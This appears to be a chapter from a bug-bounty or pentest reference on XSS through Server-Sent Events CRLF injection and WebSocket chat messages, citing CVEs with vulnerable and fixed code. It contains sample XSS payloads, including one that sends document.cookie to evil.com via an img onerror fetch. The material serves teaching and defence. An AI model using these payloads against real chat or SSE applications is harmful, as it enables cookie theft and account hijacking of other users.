# 61 - Server-Sent Events and WebSocket XSS

## Overview

Real-time communication channels introduce XSS through:
- SSE (Server-Sent Events) CRLF injection allowing event splitting and type spoofing
- WebSocket message rendering without sanitization (stored XSS variant)
- Insufficient CR/LF sanitization in SSE serialization libraries across multiple languages
- AI chat applications relaying user messages containing HTML/JavaScript

## Server-Sent Events Injection

SSE injection is an emerging vulnerability class with three CVEs in 2026 alone, affecting JavaScript (NestJS), Erlang (cowlib), and Julia (HTTP.jl). The root cause is consistent: user-controlled data reaches SSE output fields (type, id, data) without CR/LF sanitization.

### NestJS SSE Injection (CVE-2026-35515)

**CVE-2026-35515:** `SseStream._transform()` writes `message.type` and `message.id` into SSE output without removing CR/LF characters. All versions of @nestjs/core through 11.1.17 affected. Fixed in 11.1.18. CVSS 6.1 (Medium).

XSS occurs only if the client renders SSE data as HTML without sanitization. Exploitation requires developer code that passes user-controlled data into SSE type or id fields.

```typescript
// VULNERABLE: NestJS SSE with user-controlled event type
@Sse('events')
events(): Observable<MessageEvent> {
  return this.eventService.getEvents().pipe(
    map(event => ({
      type: event.category,  // User-controlled category field
      data: JSON.stringify(event.payload),
      id: event.id
    }))
  );
}

// Attack payload for event.category:
// "notification\ndata: <script>alert(1)</script>\n\nevent: "
// This splits the SSE stream, injecting a new event with XSS data

// SAFE: Strip CR/LF before using in SSE fields
@Sse('events')
events(): Observable<MessageEvent> {
  return this.eventService.getEvents().pipe(
    map(event => ({
      type: event.category.replace(/[\r\n]/g, ''),
      data: JSON.stringify(event.payload),
      id: String(event.id).replace(/[\r\n]/g, '')
    }))
  );
}
```

### cowlib Bare CR Bypass (CVE-2026-43968)

**CVE-2026-43968:** `cow_sse:event/1` filters `\n` in `id` and `event` fields but not bare `\r`. The SSE spec treats `\r` as a line terminator, so an attacker can forge whole events. Affects versions 2.6.0 through 2.16.1.

```erlang
%% Attack: Bare \r bypasses \n filtering
%% The id field is: "123\revent: malicious\rdata: <script>alert(1)</script>\r"
%% cowlib strips \n but \r acts as a line terminator per SSE spec
%% Result: a forged SSE event with attacker-controlled type and data

%% Workaround: reject or strip values containing \r or \n
```

Enables event splitting, client-side logic manipulation, and stored-XSS-equivalent behavior when event data is inserted into the DOM.

### HTTP.jl SSE Injection (JLSEC-2026-619)

**JLSEC-2026-619:** The serializer wrote `event`, `id`, and `retry` verbatim, and split `data` only on `\n`. Fixed in v2.4.0 by rejecting CR/LF in control fields and normalizing all line-break forms in `data`.

### SSE Injection Attack Flow

```
Attacker         SSE Endpoint          Client-Side EventSource
   |                  |                         |
   |-- Submit data -->|                         |
   |   with \r\n in   |                         |
   |   type/id field   |                         |
   |                  |-- SSE stream: ---------->|
   |                  |   event: legit           |
   |                  |   data: safe             |
   |                  |   \r\n                   |
   |                  |   event: spoofed         |
   |                  |   data: <script>XSS      |
   |                  |   \r\n                   |
   |                  |                         |
   |                  |                     XSS fires if
   |                  |                     client renders
   |                  |                     data as HTML
```

### Event Type Spoofing

The `event.type` field is particularly dangerous because it controls which event handler is dispatched. A spoofed event type can redirect data to a handler that does not expect or sanitize untrusted input.

```javascript
// VULNERABLE: Client-side SSE handler that trusts event types
const source = new EventSource('/api/events');

// Handler for 'notification' events -- uses innerHTML for rich content
source.addEventListener('notification', (e) => {
  document.getElementById('notifications').innerHTML += e.data;
});

// Handler for 'status' events -- expected to be plain text
source.addEventListener('status', (e) => {
  document.getElementById('status').textContent = e.data;
});

// Attack: Inject a spoofed 'notification' event via CRLF in SSE
// The payload reaches the notification handler which uses innerHTML
```

## WebSocket Message XSS

WebSocket message XSS is a well-established stored XSS variant primarily affecting real-time chat and collaboration applications. WebSocket frames receive less security scrutiny than HTTP request/response cycles.

### ChuanhuChatGPT (CVE-2024-48059)

**CVE-2024-48059:** Versions up to 20240802 allowed a WebSocket message to carry script that executed in another user's browser when they opened the session. CVSS 6.1 (Medium). The payload persists as a stored XSS.

```javascript
// Attack: WebSocket message with XSS in chat application
ws.send(JSON.stringify({
  type: 'message',
  content: '<img src=x onerror="fetch(\'https://evil.com/steal?\'+document.cookie)">'
}));

// When another user views the chat, the message renders as HTML
// The img onerror handler fires and exfiltrates cookies
```

### PHP Chat Application Stored XSS

A PHP chat application (code-projects.org v1.0) has an unpatched stored XSS in real-time messaging with no output encoding when stored messages are rendered. The payload persists in the database and executes in every user's browser, including administrators'.

### WebSocket XSS Attack Flow

```
Attacker           WebSocket Server        Database        Victim Browser
   |                     |                    |                  |
   |-- ws.send() ------->|                    |                  |
   |   {content: XSS}    |-- Store message -->|                  |
   |                     |                    |                  |
   |                     |                    |<-- Load chat ----|
   |                     |                    |                  |
   |                     |<-- Retrieve -------|                  |
   |                     |   messages          |                  |
   |                     |                    |                  |
   |                     |-- ws.send() ------>|-- Render as ---->|
   |                     |   to victim        |   HTML = XSS!    |
```

### Client-Side Filtering Is Insufficient

Relying only on client-side security is never safe because users can easily bypass it and modify outgoing data using a proxy tool. Server-side validation and output encoding are required.

## AI Chat Application XSS

AI chat applications (like ChuanhuChatGPT) are a growing attack surface because they relay user messages that may contain HTML/JavaScript and render them in web interfaces, often with markdown rendering that can be abused.

```javascript
// VULNERABLE: AI chat rendering user messages with markdown
function renderMessage(msg) {
  const html = marked.parse(msg.content);  // Markdown to HTML
  chatDiv.innerHTML += `<div class="message">${html}</div>`;
  // If msg.content = "![x](x\"onerror=\"alert(1))"
  // or msg.content contains raw <script> tags
}

// SAFE: Sanitize after markdown parsing
function renderMessage(msg) {
  const html = DOMPurify.sanitize(marked.parse(msg.content));
  chatDiv.innerHTML += `<div class="message">${html}</div>`;
}
```

## Testing Methodology

1. **Identify SSE endpoints** and test for CRLF injection in event type, id, and data fields
2. **Test bare CR (\r)** separately from LF (\n) -- many libraries filter only \n
3. **Check WebSocket message rendering** -- are messages inserted via innerHTML or textContent?
4. **Test AI chat interfaces** for markdown rendering XSS
5. **Inspect client-side EventSource handlers** for event type spoofing
6. **Test WebSocket message persistence** -- do messages survive page reload?
7. **Check for server-side validation** of WebSocket messages vs client-only filtering

## Bug Bounty Tips

1. SSE injection is cross-language: check all SSE implementations for CRLF handling
2. The SSE spec treats `\r`, `\n`, and `\r\n` as equivalent line terminators -- filtering only `\n` is insufficient
3. Event type spoofing can redirect data to handlers that use innerHTML
4. WebSocket XSS is essentially stored XSS with a different transport mechanism
5. AI chat applications are a growing XSS surface due to markdown rendering
6. No standardized security middleware exists for WebSocket messages, unlike HTTP
7. Binary WebSocket frame injection is theoretically possible but has no public CVEs
8. The lack of WebSocket XSS research in major platforms (Socket.io, Phoenix LiveView, SignalR) suggests unexplored territory
